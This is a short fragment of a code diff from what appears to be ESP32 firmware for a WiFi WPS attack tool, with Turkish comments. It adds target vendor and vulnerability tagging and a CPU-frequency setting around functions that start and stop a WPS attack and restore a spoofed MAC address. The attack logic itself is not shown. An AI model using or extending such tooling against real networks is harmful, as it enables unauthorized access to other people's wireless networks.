+      wps_targets[target_index].vendor = ssid_v;
+      wps_targets[target_index].vuln   = assess_vuln(ssid_v);
+      apply_vendor_name(ssid_v);
+      DEBUG_PRINTF("SSID vendor (son care): %s → %s\n",
+                   wps_targets[target_index].ssid, wps_vendor_name);
     }
   }
 
@@ -2520,6 +2839,7 @@ void wps_start_attack(int target_index) {
 
   WiFi.mode(WIFI_MODE_APSTA);
   delay(50);
+  setCpuFrequencyMhz(160);
   esp_wifi_set_max_tx_power(84);
   esp_wifi_set_ps(WIFI_PS_NONE);
 
@@ -2548,6 +2868,7 @@ void wps_stop() {
   WiFi.mode(WIFI_MODE_AP);
   WiFi.softAP(AP_SSID, AP_PASS);
   delay(100);
+  setCpuFrequencyMhz(160);
   esp_wifi_set_max_tx_power(84);
   esp_wifi_set_ps(WIFI_PS_NONE);
 
@@ -2585,6 +2906,7 @@ void wps_loop() {
     WiFi.mode(WIFI_MODE_AP);
     WiFi.softAP(AP_SSID, AP_PASS);
     delay(100);
+    setCpuFrequencyMhz(160);
     esp_wifi_set_max_tx_power(84);
     esp_wifi_set_ps(WIFI_PS_NONE);
     // Orijinal MAC'i geri yükle
@@ -2623,6 +2945,7 @@ void wps_loop() {
     WiFi.mode(WIFI_MODE_AP);
     WiFi.softAP(AP_SSID, AP_PASS);
     delay(100);
+    setCpuFrequencyMhz(160);
     esp_wifi_set_max_tx_power(84);
     esp_wifi_set_ps(WIFI_PS_NONE);
     if (wps_original_mac[0] != 0 || wps_original_mac[1] != 0)
